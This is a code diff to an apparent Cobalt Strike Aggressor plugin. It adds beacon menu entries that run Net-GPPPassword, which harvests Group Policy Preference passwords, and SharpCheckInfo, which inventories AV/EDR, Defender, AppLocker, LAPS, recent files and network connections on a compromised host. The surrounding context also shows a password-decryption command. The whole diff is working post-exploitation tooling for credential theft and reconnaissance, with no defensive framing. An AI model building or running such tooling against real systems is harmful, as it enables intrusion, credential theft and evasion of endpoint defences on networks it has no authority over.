@@ -6,6 +6,10 @@ sub SharpAVKB {
 	bexecute_assembly($bid, script_resource("SharpAVKB.exe"), $3['Type']);
 }
 
+sub SharpCheckInfo {
+	bexecute_assembly($bid, script_resource("SharpCheckInfo.exe"), $3['Type']);
+}
+
 sub SharpDecryptPwd {
 	if($3['type'] =~ "-Xmangager"){
 		$arg = join(' ', @($3['type'],"-p",$3['path']));
@@ -98,7 +102,17 @@ popup beacon_bottom {
             dbutton_action($dialog, "Neo Go ~~");
 			dialog_show($dialog);
         }
-		
+		item "Net-GPPPassword" {
+			bexecute_assembly($1, script_resource("Net-GPPPassword.exe"), "");
+		}
+		item "SharpCheckInfo" {
+			$bid = $1;
+			$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
+			dialog_description($dialog, "Information Gathering");
+			drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
+            dbutton_action($dialog, "Neo Go ~~");
+			dialog_show($dialog);
+        }
     }
 }
 
